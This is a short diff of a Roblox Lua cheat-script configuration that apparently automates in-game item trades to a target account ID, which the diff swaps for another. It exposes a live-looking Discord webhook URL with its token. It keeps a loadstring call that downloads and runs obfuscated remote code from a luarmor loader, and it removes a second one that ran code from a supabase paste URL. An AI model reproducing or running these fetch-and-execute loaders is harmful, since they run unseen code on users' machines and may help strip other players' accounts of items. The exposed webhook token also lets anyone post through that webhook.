@@ -1,5 +1,5 @@
 getgenv().SECRET_KEY = "YOUR_API_KEY"
-getgenv().TARGET_ID = 7137572885
+getgenv().TARGET_ID = 9388660315
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2
 getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1482049851465142335/qOiDFhe49W1O5y23uUNDoVDpKklUvdfJsjBNsVqQ-auWc-RMS2jW_wHZL37cj76EaplD"
@@ -74,9 +74,4 @@ getgenv().TARGET_BRAINROTS = {
     ["Los Amigos"] = true,
     ["Lovin Rose"] = true
 }
-task.spawn(function()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
-end)
-task.spawn(function()
-loadstring(Game:HttpGet("https://iyfvpnjrghsownkpazec.supabase.co/functions/v1/get-paste?slug=0HY4ZGHJ"))()
-end)
